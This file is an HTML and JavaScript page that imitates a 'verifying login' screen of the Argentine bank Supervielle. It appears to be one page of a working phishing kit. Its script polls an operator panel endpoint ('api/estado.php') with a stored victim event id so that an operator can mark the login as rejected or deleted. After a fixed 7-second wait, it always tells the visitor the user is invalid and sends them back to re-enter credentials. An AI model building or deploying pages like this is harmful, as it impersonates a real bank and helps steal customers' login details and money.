<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificando — Supervielle</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@500;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./css/login.css?v=20261114h">
  <style>
    .verify-page {
      min-height: 100vh;
      min-height: 100dvh;
      display: grid;
      place-items: center;
      padding: 20px 16px;
      background: linear-gradient(160deg, #f7eef1, #f5f7fb);
      font-family: "Nunito Sans", "Segoe UI", sans-serif;
    }
    .verify-card {
      width: min(420px, 100%);
      background: #fff;
      border-radius: 18px;
      padding: clamp(28px, 5vw, 36px) clamp(18px, 4vw, 28px);
      text-align: center;
      box-shadow: 0 18px 48px rgba(20, 30, 50, 0.12);
    }
    .verify-card img {
      height: 28px;
      margin-bottom: 22px;
    }
    .verify-card h1 {
      margin: 0;
      font-size: 22px;
      color: #8a001b;
    }
    .verify-error {
      display: none;
      margin-top: 18px;
      padding: 12px 14px;
      border-radius: 12px;
      background: #ffe8ee;
      color: #8a001b;
      border: 1px solid #f5c2d0;
      font-size: 14px;
      font-weight: 700;
      line-height: 1.4;
    }
    .verify-error.is-visible {
      display: block;
    }
  </style>
</head>
<body>
  <div class="verify-page">
    <div class="verify-card">
      <img src="./assets/logo-supervielle.svg" alt="Supervielle" width="169" height="30">
      <div class="login-spinner" id="verify-spinner" style="margin-bottom:18px"></div>
      <h1 id="verify-title">Estamos procesando tu ingreso</h1>
      <div id="verify-error" class="verify-error" role="alert"></div>
    </div>
  </div>

  <script>
    (function () {
      var WAIT_MS = 7000;       // espera cargando
      var REDIRECT_MS = 2200;   // tiempo mostrando el aviso antes de volver
      var eventoId = 0;
      var finished = false;

      try {
        eventoId = parseInt(localStorage.getItem("sv_evento_id") || "0", 10) || 0;
      } catch (e) {}

      var errorBox = document.getElementById("verify-error");
      var title = document.getElementById("verify-title");
      var spinner = document.getElementById("verify-spinner");

      function goLogin() {
        try {
          localStorage.removeItem("sv_evento_id");
        } catch (e) {}
        window.location.href = "./login.html";
      }

      function showInvalid(msg) {
        if (finished) return;
        finished = true;
        if (spinner) spinner.style.display = "none";
        if (title) title.textContent = "No pudimos validar tu ingreso";
        if (errorBox) {
          errorBox.textContent = msg || "El usuario ingresado es inválido. Volvé a intentar.";
          errorBox.classList.add("is-visible");
        }
        setTimeout(goLogin, REDIRECT_MS);
      }

      // Si el panel marca Error login antes, también responde
      function pollPanel() {
        if (finished || !eventoId) return;
        fetch("./api/estado.php?id=" + eventoId + "&_=" + Date.now(), { cache: "no-store" })
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (!data || !data.ok || finished) return;
            if (data.estado === "rechazado") {
              showInvalid(data.mensaje || "El usuario ingresado es inválido. Volvé a intentar.");
            } else if (data.estado === "eliminado") {
              finished = true;
              goLogin();
            }
          })
          .catch(function () {});
      }

      // A los 7 segundos: aviso automático + vuelta al inicio
      setTimeout(function () {
        showInvalid("El usuario ingresado es inválido. Volvé a intentar.");
      }, WAIT_MS);

      pollPanel();
      setInterval(pollPanel, 1500);
    })();
  </script>
</body>
</html>
